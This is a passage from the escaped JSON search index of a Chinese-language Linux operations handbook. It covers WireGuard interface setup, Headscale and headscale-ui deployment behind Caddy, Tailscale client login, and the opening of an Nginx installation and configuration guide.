\u200b\u662f\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u540d\u79f0\u200b\uff0c\u200b\u4e0d\u200b\u5305\u62ec\u200b <code>.conf</code> \u200b\u540e\u7f00\u200b\u3002</p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u57fa\u4e8e\u200b systemd \u200b\u5bf9\u200b <code>wg-quick</code> \u200b\u5de5\u5177\u200b\u751f\u6210\u200b\u7684\u200b\u63a5\u53e3\u200b\u8fdb\u884c\u200b\u7ba1\u7406\u200b\uff1a</p> <pre><code>sudo systemctl start wg-quick@wg0\nsudo systemctl stop wg-quick@wg0\n</code></pre>"},{"location":"ops/network-service/intranet/#interface-wireguard","title":"\u57fa\u4e8e\u200b interface \u200b\u8bbe\u7f6e\u200b WireGuard \u200b\u63a5\u53e3","text":"<p>\u200b\u573a\u666f\u200b\u540c\u200b\u4e0a\u200b\uff0cB \u200b\u7684\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>auto wg0\niface wg0 inet static\n    address 10.0.0.4\n    netmask 255.255.255.255\n    pointopoint 10.0.0.1\n    pre-up ip link add dev $IFACE type wireguard\n    post-down ip link del dev $IFACE\n    up wg set $IFACE private-key &lt;B \u200b\u7684\u200b\u79c1\u94a5\u200b&gt; peer &lt;A \u200b\u7684\u200b\u516c\u94a5\u200b&gt; endpoint example.com:51820 allowed-ips 0.0.0.0/0,::/0\n</code></pre> <p>\u200b\u4f7f\u7528\u200b\u4f20\u7edf\u200b\u7684\u200b <code>ifupdown</code> \u200b\u5de5\u5177\u200b\u5373\u53ef\u200b\u542f\u505c\u200b WireGuard \u200b\u63a5\u53e3\u200b\uff1a</p> <pre><code>sudo ifup wg0\nsudo ifdown wg0\n</code></pre>"},{"location":"ops/network-service/intranet/#_4","title":"\u68c0\u67e5\u200b\u63a5\u53e3\u200b\u72b6\u6001","text":"<p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>wg</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7684\u200b WireGuard \u200b\u72b6\u6001\u200b\uff1a</p> <pre><code>sudo wg\n</code></pre>"},{"location":"ops/network-service/intranet/#headscale","title":"Headscale","text":"<p>\u200b\u5728\u200b\u90e8\u5206\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u5355\u7eaf\u200b Wireguard \u200b\u4e0d\u80fd\u200b\u5f88\u200b\u597d\u200b\u6ee1\u8db3\u200b\u9700\u6c42\u200b\uff0c\u200b\u4f8b\u5982\u200b\u9700\u8981\u200b peer-to-peer \u200b\u4e4b\u95f4\u200b\u7684\u200b\u4e92\u8054\u200b\uff08\u200b\u4e0d\u200b\u7ecf\u8fc7\u200b\u4e2d\u5fc3\u200b\u8282\u70b9\u200b\uff09\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u66f4\u200b\u590d\u6742\u200b\u7684\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u4e0b\u200b\u3002Tailscale \u200b\u4fbf\u662f\u200b\u4e00\u4e2a\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff0c\u200b\u6211\u4eec\u200b\u8fd9\u91cc\u200b\u4ecb\u7ecd\u200b Headscale\uff0c\u200b\u4e00\u4e2a\u200b\u5f00\u6e90\u200b\u7684\u200b Tailscale \u200b\u670d\u52a1\u7aef\u200b\u5b9e\u73b0\u200b\u3002</p> <p>Headscale \u200b\u4ec5\u200b\u662f\u200b Tailscale \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5f00\u6e90\u200b\u3001\u200b\u53ef\u200b\u81ea\u884c\u200b\u90e8\u7f72\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u4ecd\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b Tailscale\u3002</p>"},{"location":"ops/network-service/intranet/#headscale_1","title":"\u5b89\u88c5\u200b Headscale","text":"<p>\u200b\u622a\u6b62\u200b\u7f16\u8f91\u200b\u65f6\u200b\uff0cHeadscale \u200b\u5c1a\u200b\u4e0d\u200b\u63d0\u4f9b\u200b apt repo\uff0c\u200b\u9700\u8981\u200b\u5728\u200b GitHub Release \u200b\u9009\u62e9\u200b <code>.deb</code> \u200b\u5b89\u88c5\u200b\uff1a</p> <pre><code>wget --output-document=headscale.deb &lt;URL&gt;\nsudo apt install ./headscale.deb\n</code></pre>"},{"location":"ops/network-service/intranet/#headscale_2","title":"\u914d\u7f6e\u200b Headscale","text":"<p>\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4f4d\u4e8e\u200b <code>/etc/headscale/config.yaml</code>\uff0c\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1ahttps://github.com/juanfont/headscale/blob/main/config-example.yaml</p>"},{"location":"ops/network-service/intranet/#headscale_3","title":"\u542f\u52a8\u200b Headscale","text":"<pre><code>sudo systemctl enable --now headscale\nsudo systemctl status headscale\n</code></pre>"},{"location":"ops/network-service/intranet/#headscale-ui","title":"\u5b89\u88c5\u200b Headscale-ui","text":"<p>\u200b\u4e0e\u200b Tailscale \u200b\u4e0d\u540c\u200b\uff0cHeadscale \u200b\u76ee\u524d\u200b\u6ca1\u6709\u200b\u96c6\u6210\u200b\u7684\u200b Admin Console\uff0c\u200b\u53ef\u4ee5\u200b\u90e8\u7f72\u200b headscale-ui \u200b\u66ff\u4ee3\u200b\u90e8\u5206\u200b\u529f\u80fd\u200b\u3002\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u7eaf\u200b\u9759\u6001\u200b\u7684\u200b Web \u200b\u754c\u9762\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b GitHub Release \u200b\u4e0b\u8f7d\u200b <code>headscale-ui.zip</code>\u3002</p> <pre><code>wget --output-document=headscale-ui.zip &lt;URL&gt;\nunzip headscale-ui.zip -d /var/www/headscale-ui\n</code></pre>"},{"location":"ops/network-service/intranet/#_5","title":"\u914d\u7f6e\u200b\u53cd\u5411\u200b\u4ee3\u7406","text":"<p>\u200b\u4ee5\u200b Caddy \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6211\u4eec\u200b\u6f14\u793a\u200b\u5982\u4f55\u200b\u914d\u7f6e\u200b Headscale &amp; Headscale-ui\uff1a</p> /etc/caddy/Caddyfile<pre><code>headscale.****.**** {\n        handle_path /web* {\n                root * /var/www/headscale-ui\n                file_server\n        }\n\n        reverse_proxy * 127.0.0.1:8080\n}\n</code></pre> <p>Nginx \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\uff1ahttps://headscale.net/ref/integration/reverse-proxy/#nginx</p>"},{"location":"ops/network-service/intranet/#api-key","title":"\u8bbe\u7f6e\u200b API Key","text":"<pre><code>sudo headscale apikeys create --expiration 9999d\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u6d4f\u89c8\u5668\u200b\u8bbf\u95ee\u200b <code>/web</code>\uff0c\u200b\u5728\u200b Settings \u200b\u754c\u9762\u200b\u4e2d\u200b\u586b\u5199\u200b API Key\u3002</p>"},{"location":"ops/network-service/intranet/#_6","title":"\u6dfb\u52a0\u200b\u7528\u6237","text":"<pre><code>sudo headscale users create &lt;NAME&gt;\n</code></pre>"},{"location":"ops/network-service/intranet/#_7","title":"\u5ba2\u6237\u7aef\u200b\u8bbe\u7f6e","text":"<p>\u200b\u4e0e\u200b\u4e00\u822c\u200b\u8fde\u63a5\u200b Tailscale \u200b\u65b9\u6cd5\u200b\u4e0d\u540c\u200b\uff0c\u200b\u9700\u8981\u200b\u6307\u5b9a\u200b <code>--login-server</code> \u200b\u548c\u200b <code>--auth-key</code>\uff1a</p> <pre><code>tailscale up --login-server &lt;URL&gt; --authkey &lt;KEY&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>authkey</code> \u200b\u53ef\u4ee5\u200b\u5728\u200b\u7ba1\u7406\u200b\u9762\u677f\u200b\uff08headscale-ui\uff09\u200b\u4e2d\u200b\u83b7\u53d6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>sudo headscale preauthkeys create --user &lt;NAME&gt;\n</code></pre>"},{"location":"ops/network-service/intranet/#_8","title":"\u5217\u51fa\u200b\u5176\u4ed6\u200b\u8282\u70b9","text":"<pre><code>tailscale status\n</code></pre>"},{"location":"ops/network-service/nginx/","title":"Nginx \u200b\u670d\u52a1\u5668","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@Cherrling\u3001@iBug\u3001@taoky</p> <p>Web server \u200b\u4e0d\u80fd\u200b\u5931\u53bb\u200b Nginx\uff0c\u200b\u5c31\u200b\u5982\u540c\u200b\u897f\u65b9\u200b\u4e0d\u80fd\u200b\u5931\u53bb\u200b\u8036\u8def\u6492\u51b7\u200b</p> <p>\u2014\u2014 @Cherrling</p> <p>Nginx \u200b\u662f\u200b\u4e00\u4e2a\u200b\u9ad8\u6027\u80fd\u200b\u7684\u200b\u5f00\u6e90\u200b Web \u200b\u670d\u52a1\u5668\u200b\u548c\u200b\u53cd\u5411\u200b\u4ee3\u7406\u670d\u52a1\u5668\u200b\uff0c\u200b\u4ee5\u200b\u7a33\u5b9a\u6027\u200b\u9ad8\u200b\u3001\u200b\u6027\u80fd\u200b\u4f18\u5f02\u200b\u3001\u200b\u5e76\u53d1\u200b\u80fd\u529b\u200b\u5f3a\u200b\u7b49\u200b\u4f18\u52bf\u200b\u88ab\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u53ea\u662f\u200b\u9700\u8981\u200b\u7b80\u5355\u200b\u5feb\u901f\u200b\u7684\u200b\u62c9\u8d77\u200b\u4e00\u4e2a\u200b\u7f51\u7ad9\u200b\uff0c\u200b\u6216\u8bb8\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8bd5\u8bd5\u200b Caddy\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\u7684\u200b Web \u200b\u670d\u52a1\u5668\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#install","title":"\u5b89\u88c5","text":"<p>Nginx \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b Debian APT \u200b\u6e90\u200b\u5b89\u88c5\u200b\u3002\u200b\u5176\u200b\u8bb8\u591a\u200b\u5e38\u7528\u200b\u6a21\u5757\u200b\u88ab\u200b\u6253\u5305\u200b\u5728\u200b\u989d\u5916\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u4e2d\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b\u5305\u540d\u200b\u4ee5\u200b <code>libnginx-mod-</code> \u200b\u5f00\u5934\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9700\u8981\u200b\u9009\u88c5\u200b\u3002\u200b\u540c\u65f6\u200b\uff0cDebian \u200b\u4e5f\u200b\u5c06\u200b\u6a21\u5757\u200b\u6309\u200b\u5e38\u7528\u200b\u7a0b\u5ea6\u200b\u5206\u4e3a\u200b\u4e86\u200b\u56db\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b meta \u200b\u8f6f\u4ef6\u5305\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b\u8fd9\u4e9b\u200b meta \u200b\u8f6f\u4ef6\u5305\u200b\uff1a</p> \u200b\u4ec5\u200b Nginx \u200b\u672c\u4f53\u200b\u4e0e\u200b\u6838\u5fc3\u200b\u6a21\u5757\u200b\u6700\u200b\u8f7b\u91cf\u200b\u7684\u200b\u6a21\u5757\u200b\u96c6\u5408\u200b\u300c\u200b\u6838\u5fc3\u200b\u300d\u200b\u6a21\u5757\u200b\u96c6\u5408\u200b\u5e38\u7528\u200b\u7684\u200b\u6a21\u5757\u200b\u96c6\u5408\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b\u7684\u200b\u6a21\u5757\u200b <pre><code>sudo apt install nginx\n</code></pre> <pre><code>sudo apt install nginx-light\n</code></pre> <pre><code>sudo apt install nginx-core\n</code></pre> <pre><code>sudo apt install nginx-full\n</code></pre> <pre><code>sudo apt install nginx-extras\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u5176\u4ed6\u200b\u7684\u200b\u9009\u62e9\u200b\uff1a</p> <ul> <li>Nginx.org \u200b\u6e90\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6700\u65b0\u200b\u4e3b\u7ebf\u200b\u548c\u200b\u7a33\u5b9a\u200b\u7248\u672c\u200b\u7684\u200b Nginx\u3002</li> <li>n.wtf \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\u7684\u200b Nginx\uff0c\u200b\u5e76\u200b\u5185\u7f6e\u200b\u4e86\u200b Brotli\u3001QUIC\uff08HTTP/3\uff09\u200b\u7b49\u200b\u652f\u6301\u200b\u3002\u200b\u7279\u522b\u200b\u5730\u200b\uff0cn.wtf \u200b\u7248\u672c\u200b\u7684\u200b Nginx \u200b\u91c7\u7528\u200b Debian \u200b\u7684\u200b\u6253\u5305\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u662f\u200b Debian \u200b\u5b98\u65b9\u200b\u5305\u200b\u5f88\u200b\u597d\u200b\u7684\u200b\u66ff\u4ee3\u200b\u3002</li> <li>OpenResty \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u57fa\u4e8e\u200b Nginx \u200b\u7684\u200b\u9ad8\u6027\u80fd\u200b Web \u200b\u5e73\u53f0\u200b\uff0c\u200b\u5185\u7f6e\u200b\u4e86\u200b LuaJIT \u200b\u652f\u6301\u200b\u3002\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u7f16\u5199\u200b Lua \u200b\u811a\u672c\u200b\u6765\u200b\u6269\u5c55\u200b Nginx \u200b\u7684\u200b\u529f\u80fd\u200b\u3002</li> </ul> <p>\u200b\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4ee5\u4e0a\u200b\u4e09\u79cd\u200b\u6e90\u200b\u7684\u200b\u955c\u50cf\u200b\uff0c\u200b\u5206\u522b\u200b\u4f4d\u4e8e\u200b <code>nginx</code>\u3001<code>sb</code>\uff08n.wtf\uff09\u200b\u548c\u200b <code>openresty</code>\u3002</p> <p>\u200b\u7ba1\u7406\u200b Nginx \u200b\u7684\u200b\u5e38\u7528\u547d\u4ee4\u200b\uff1a</p> <pre><code>sudo nginx -t # \u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\nsudo nginx -s reload # \u200b\u4e0d\u200b\u505c\u673a\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsudo nginx -s stop # \u200b\u505c\u6b62\u200b Nginx\nsudo nginx -s quit # \u200b\u5b89\u5168\u200b\u505c\u6b62\u200b Nginx\uff08\u200b\u5b8c\u6210\u200b\u5f53\u524d\u200b\u8bf7\u6c42\u200b\u540e\u200b\u505c\u6b62\u200b\uff09\n</code></pre> <p>\u200b\u5bf9\u4e8e\u200b\u4f7f\u7528\u200b systemd \u200b\u7ba1\u7406\u200b Nginx \u200b\u670d\u52a1\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff1a</p> <pre><code>sudo systemctl reload nginx # \u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u6587\u4ef6\u200b\nsudo systemctl stop nginx # \u200b\u5b89\u5168\u200b\u505c\u6b62\u200b Nginx\n</code></pre>"},{"location":"ops/network-service/nginx/#configuration","title":"\u914d\u7f6e\u6587\u4ef6","text":"<p>\u200b\u5bf9\u4e8e\u200b Debian &amp; Ubuntu \u200b\u6765\u8bf4\u200b\uff0c<code>nginx.conf</code> \u200b\u7684\u200b\u5185\u5bb9\u200b\u4e00\u822c\u200b\u5305\u542b\u200b\uff1a</p> <pre><code>http {\n    # ...\n    include /etc/nginx/conf.d/*.conf;\n    include /etc/nginx/sites-enabled/*;\n}\n</code></pre> <p>\u200b\u914d\u7f6e\u200b Nginx \u200b\u4e3b\u8981\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e09\u4e2a\u200b\u76ee\u5f55\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b <code>/etc/nginx/nginx.conf</code>\u3001<code>/etc/nginx/sites-available</code> \u200b\u548c\u200b <code>/etc/nginx/sites-enabled</code>\u3002</p> <ul> <li><code>nginx.conf</code> \u200b\u662f\u200b Nginx \u200b\u7684\u200b\u4e3b\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u5b83\u200b\u5305\u542b\u200b\u4e86\u200b Nginx \u200b\u7684\u200b\u5168\u5c40\u200b\u914d\u7f6e\u200b\u3002</li> <li><code>sites-available</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u5b58\u653e\u200b\u7684\u200b\u662f\u200b\u6240\u6709\u200b\u7684\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3002</li> <li><code>sites-enabled</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u5b58\u653e\u200b\u7684\u200b\u662f\u200b\u542f\u7528\u200b\u7684\u200b\u7ad9\u70b9\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7684\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\u3002</li> </ul> <p>\u200b\u4e00\u822c\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5728\u200b <code>nginx.conf</code> \u200b\u6587\u4ef6\u200b\u7684\u200b <code>http</code> \u200b\u5757\u200b\u4e2d\u200b\u76f4\u63a5\u200b\u7f16\u5199\u200b\u7ad9\u70b9\u200b\u4fe1\u606f\u200b\uff0c\u200b\u800c\u662f\u200b\u5728\u200b <code>sites-available</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b <code>sites-enabled</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u6682\u65f6\u200b\u4e0b\u7ebf\u200b\u67d0\u4e2a\u200b\u7ad9\u70b9\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u5220\u9664\u200b <code>sites-enabled</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u7b26\u53f7\u200b\u94fe\u63a5\u200b\u5373\u53ef\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5220\u9664\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u4ece\u200b Nginx \u200b\u7684\u200b\u89d2\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u552f\u4e00\u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\u6765\u81ea\u200b <code>conf.d</code> \u200b\u7684\u200b\u6587\u4ef6\u200b\u80fd\u591f\u200b\u66f4\u200b\u65e9\u200b\u88ab\u200b\u5904\u7406\u200b\uff0c\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u6709\u200b\u76f8\u4e92\u200b\u51b2\u7a81\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6765\u81ea\u200b <code>conf.d</code> \u200b\u7684\u200b\u914d\u7f6e\u200b\u4f1a\u200b\u4f18\u5148\u200b\u4e8e\u200b <code>sites-enabled</code> \u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5176\u4ed6\u200b\u53d1\u884c\u7248\u200b\u548c\u200b Nginx \u200b\u5b98\u65b9\u200b\u7684\u200b\u914d\u7f6e\u200b</p> <p>\u200b\u5bf9\u4e8e\u200b\u5176\u4ed6\u200b\u53d1\u884c\u7248\u200b\u548c\u200b\u5b98\u65b9\u200b\u6e90\u200b\u6765\u8bf4\u200b\uff0c\u200b\u914d\u7f6e\u200b\u4e2d\u5219\u200b\u4e0d\u200b\u5305\u542b\u200b <code>sites-available</code> \u200b\u548c\u200b <code>sites-enabled</code>\uff0c\u200b\u800c\u662f\u200b\u53ea\u4f1a\u200b <code>include</code> <code>conf.d</code> \u200b\u76ee\u5f55\u200b\uff1a</p> <pre><code>http {\n    # ...\n    include /etc/nginx/conf.d/*.conf;\n}\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u5c06\u200b\u4f60\u200b\u7f16\u5199\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u653e\u7f6e\u200b\u4e8e\u200b <code>/etc/nginx/conf.d</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\uff0c\u200b\u4f46\u200b\u5f53\u200b\u4f60\u200b\u9700\u8981\u200b\u7981\u7528\u200b\u67d0\u4e9b\u200b\u5185\u5bb9\u200b\u65f6\u200b\uff0c\u200b\u5fc5\u987b\u200b\u5c06\u200b\u5176\u200b\u79fb\u51fa\u200b\u6587\u4ef6\u5939\u200b\u3001\u200b\u5220\u9664\u200b\u6216\u200b\u8fdb\u884c\u200b\u66f4\u6539\u200b\u3002\u200b\u5f53\u7136\u200b\uff0c\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u521b\u5efa\u200b <code>sites-available</code> \u200b\u548c\u200b <code>sites-enabled</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b <code>nginx.conf</code> \u200b\u4e2d\u200b\u5f15\u5165\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#reload","title":"\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e","text":"<p>\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u540e\u200b\uff0c\u200b\u522b\u5fd8\u4e86\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b Nginx \u200b\u914d\u7f6e\u200b\uff0c\u200b\u5426\u5219\u200b\u4fee\u6539\u200b\u4e0d\u4f1a\u200b\u751f\u6548\u200b\u3002</p> <p>\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u5148\u200b\u68c0\u67e5\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff1a</p> <pre><code>sudo nginx -t\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u5c31\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff1a</p> <pre><code>sudo systemctl reload nginx  # \u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\n# \u200b\u6216\u8005\u200b\nsudo nginx -s reload\n</code></pre> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u5b58\u5728\u200b\u9519\u8bef\u200b\uff0c\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u7684\u200b\u65f6\u5019\u200b\u4f1a\u200b\u62a5\u51fa\u200b\u8fd9\u4e9b\u200b\u9519\u8bef\u200b\uff0c\u200b\u7136\u540e\u200b Nginx \u200b\u4f1a\u4ee5\u200b\u65e7\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7ee7\u7eed\u200b\u8fd0\u884c\u200b\u3002</p> Nginx \u200b\u7684\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u4e0e\u200b\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u8bbe\u8ba1\u200b <p>Nginx \u200b\u91c7\u7528\u200b\u4e86\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\uff08master process\uff09\u200b\u548c\u200b\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\uff08worker process\uff09\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u3002\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u8d1f\u8d23\u200b\u8bfb\u53d6\u200b\u914d\u7f6e\u200b\u3001\u200b\u6253\u5f00\u200b\u7aef\u53e3\u200b\u3001\u200b\u7ba1\u7406\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\uff0c\u200b\u800c\u200b\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\u5219\u200b\u8d1f\u8d23\u200b\u5904\u7406\u200b\u5b9e\u9645\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u5f53\u200b\u4f60\u200b\u5411\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u53d1\u9001\u200b SIGHUP \u200b\u4fe1\u53f7\u200b\u65f6\u200b\uff08\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff09\uff0c\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u5148\u200b\u9a8c\u8bc1\u200b\u65b0\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u6210\u529f\u200b\u540e\u200b\u4f1a\u200b\u542f\u52a8\u200b\u65b0\u200b\u7684\u200b\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\u6765\u200b\u5e94\u7528\u200b\u65b0\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba9\u200b\u65e7\u200b\u7684\u200b\u5de5\u4f5c\u200b\u8fdb\u7a0b\u200b\u505c\u6b62\u200b\u63a5\u53d7\u200b\u65b0\u200b\u8fde\u63a5\u200b\uff0c\u200b\u5904\u7406\u200b\u5b8c\u6210\u200b\u5df2\u6709\u200b\u7684\u200b\u8fde\u63a5\u200b\u4e4b\u540e\u200b\u518d\u200b\u9000\u51fa\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6b63\u5728\u200b\u5904\u7406\u200b\u7684\u200b\u8bf7\u6c42\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u7a81\u7136\u200b\u4e2d\u65ad\u200b\u3002</p>"},{"location":"ops/network-service/nginx/#directives-variables-modules","title":"\u6307\u4ee4\u200b\u3001\u200b\u53d8\u91cf\u200b\u4e0e\u200b\u6a21\u5757","text":"<p>Nginx \u200b\u7684\u200b\u914d\u7f6e\u200b\u7531\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\uff08directive\uff09\u200b\u7ec4\u6210\u200b\u3002directive \u200b\u6709\u200b\u4e24\u79cd\u200b\uff1a\u200b\u7b80\u5355\u200b directive \u200b\u548c\u200b\u5757\u200b directive\u3002\u200b\u5728\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c<code>http</code> \u200b\u5757\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5757\u200b directive\uff0c\u200b\u800c\u200b <code>include</code> \u200b\u5219\u200b\u662f\u200b\u7b80\u5355\u200b directive\u3002</p> <p>Nginx \u200b\u7684\u200b\u914d\u7f6e\u200b\u8fd8\u200b\u652f\u6301\u200b\u53d8\u91cf\u200b\u3002\u200b\u5728\u200b\u4e4b\u540e\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c<code>$host</code>\u3001<code>$remote_addr</code>\u3001<code>$uri</code> \u200b\u7b49\u200b\u90fd\u200b\u662f\u200b\u53d8\u91cf\u200b\uff0cNginx \u200b\u4f1a\u200b\u5728\u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\u7684\u200b\u65f6\u5019\u200b\u5c06\u200b\u5b83\u4eec\u200b\u66ff\u6362\u200b\u4e3a\u200b\u5b9e\u9645\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u7528\u6237\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>set</code> \u200b\u6307\u4ee4\u200b\u6765\u200b\u5b9a\u4e49\u200b\u81ea\u5df1\u200b\u7684\u200b\u53d8\u91cf\u200b\uff1a</p> <pre><code>set $my_variable \"Hello, World!\";\n</code></pre> <p>Nginx \u200b\u662f\u200b\u6a21\u5757\u5316\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5176\u4e2d\u200b <code>ngx_http_core_module</code> \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u57fa\u7840\u200b\u7684\u200b\u8ba9\u200b Nginx \u200b\u63d0\u4f9b\u200b HTTP 